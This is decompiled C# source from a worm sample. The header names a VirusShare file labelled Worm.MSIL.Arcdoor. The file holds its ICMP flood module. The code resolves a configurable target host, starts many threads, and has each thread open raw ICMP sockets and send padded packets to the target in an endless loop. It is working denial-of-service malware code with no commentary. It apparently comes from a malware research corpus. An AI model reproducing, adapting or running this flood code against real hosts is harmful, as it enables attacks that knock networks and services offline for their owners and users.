// Decompiled with JetBrains decompiler
// Type: SysDriver.nICMPFlood
// Assembly: SysDriver, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8A26C35F-BA28-4E81-84A7-2E70BFB0BF2E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Worm.MSIL.Arcdoor.rd-c1c8aa0e1c017af03529dea9d73a38478f6fd04477b4a68c5889f87bb96df945.exe

using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace SysDriver
{
  internal class nICMPFlood
  {
    private static ThreadStart[] tFloodingJob;
    private static Thread[] tFloodingThread;
    public static string sFHost;
    public static int iICMPSockets;
    private static IPEndPoint IPEo;
    public static int iPSize;
    private static nICMPFlood.ICMPRequest[] ICMPClass;
    public static int iThreads;

    public static void StartICMPFlood()
    {
      try
      {
        nICMPFlood.IPEo = new IPEndPoint(Dns.GetHostEntry(nICMPFlood.sFHost).AddressList[0], 0);
      }
      catch
      {
        nICMPFlood.IPEo = new IPEndPoint(IPAddress.Parse(nICMPFlood.sFHost), 0);
      }
      nICMPFlood.tFloodingThread = new Thread[nICMPFlood.iThreads];
      nICMPFlood.tFloodingJob = new ThreadStart[nICMPFlood.iThreads];
      nICMPFlood.ICMPClass = new nICMPFlood.ICMPRequest[nICMPFlood.iThreads];
      for (int index = 0; index < nICMPFlood.iThreads; ++index)
      {
        nICMPFlood.ICMPClass[index] = new nICMPFlood.ICMPRequest(nICMPFlood.IPEo, nICMPFlood.iICMPSockets, nICMPFlood.iPSize);
        nICMPFlood.tFloodingJob[index] = new ThreadStart(nICMPFlood.ICMPClass[index].Send);
        nICMPFlood.tFloodingThread[index] = new Thread(nICMPFlood.tFloodingJob[index]);
        nICMPFlood.tFloodingThread[index].Start();
      }
    }

    public static void StopICMPFlood()
    {
      for (int index = 0; index < nICMPFlood.iThreads; ++index)
      {
        try
        {
          nICMPFlood.tFloodingThread[index].Abort();
          nICMPFlood.tFloodingThread[index].Join();
        }
        catch
        {
        }
      }
    }

    private class ICMPRequest
    {
      private int iICMPSockets;
      private IPEndPoint IPEo;
      private int iPSize;
      private Socket[] pSocket;

      public ICMPRequest(IPEndPoint tIPEo, int tICMPSockets, int tPSize)
      {
        this.IPEo = tIPEo;
        this.iICMPSockets = tICMPSockets;
        this.iPSize = tPSize;
      }

      public void Send()
      {
        byte[] buffer = new byte[this.iPSize];
        while (true)
        {
          try
          {
            this.pSocket = new Socket[this.iICMPSockets];
            for (int index = 0; index < this.iICMPSockets; ++index)
            {
              this.pSocket[index] = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp);
              this.pSocket[index].Blocking = false;
              this.pSocket[index].SendTo(buffer, (EndPoint) this.IPEo);
            }
            Thread.Sleep(100);
            for (int index = 0; index < this.iICMPSockets; ++index)
            {
              if (this.pSocket[index].Connected)
                this.pSocket[index].Disconnect(false);
              this.pSocket[index].Close();
              this.pSocket[index] = (Socket) null;
            }
            this.pSocket = (Socket[]) null;
          }
          catch
          {
            for (int index = 0; index < this.iICMPSockets; ++index)
            {
              try
              {
                if (this.pSocket[index].Connected)
                  this.pSocket[index].Disconnect(false);
                this.pSocket[index].Close();
                this.pSocket[index] = (Socket) null;
              }
              catch
              {
              }
            }
          }
        }
      }
    }
  }
}
